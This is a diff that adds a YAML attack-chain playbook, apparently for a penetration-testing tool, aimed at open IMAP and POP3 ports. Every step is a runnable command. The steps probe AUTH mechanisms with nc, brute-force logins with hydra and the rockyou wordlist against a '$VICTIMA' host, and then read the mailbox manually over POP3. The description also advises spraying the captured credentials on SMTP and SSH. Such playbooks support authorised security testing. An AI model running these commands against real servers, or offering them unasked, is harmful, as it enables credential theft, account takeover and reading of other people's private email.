@@ -1,0 +1,48 @@
+chain_id: imap_pop3_brute
+title: "IMAP / POP3 — brute force then read mailbox"
+severity: MEDIUM
+tags: [imap, pop3, brute-force, mailbox, recon]
+
+trigger:
+  any_of:
+    - { port: 110 }
+    - { port: 143 }
+    - { port: 993 }
+    - { port: 995 }
+    - { service: imap }
+    - { service: imaps }
+    - { service: pop3 }
+    - { service: pop3s }
+
+description: |
+  Open mail-retrieval port. IMAP and POP3 both authenticate against the
+  same backing user store as SMTP — brute-forcing one yields creds you
+  can spray on the others (and on SSH if the server's a Linux mailbox).
+
+steps:
+  - id: 1
+    title: "Probe — note which AUTH mechanisms the server advertises"
+    command: |
+      nc $VICTIMA 143 <<<'a CAPABILITY'
+      nc $VICTIMA 110 <<<'CAPA'
+
+  - id: 2
+    title: "Brute-force IMAP"
+    command: hydra -L users.txt -P /usr/share/wordlists/rockyou.txt $VICTIMA imap
+
+  - id: 3
+    title: "Same for POP3"
+    command: hydra -L users.txt -P /usr/share/wordlists/rockyou.txt $VICTIMA pop3
+
+  - id: 4
+    title: "Read the mailbox once authenticated (POP3, manual)"
+    command: |
+      nc $VICTIMA 110
+      USER USUARIO
+      PASS PASSWORD
+      LIST
+      RETR 1
+
+references:
+  - https://book.hacktricks.xyz/network-services-pentesting/pentesting-imap
+  - https://book.hacktricks.xyz/network-services-pentesting/pentesting-pop
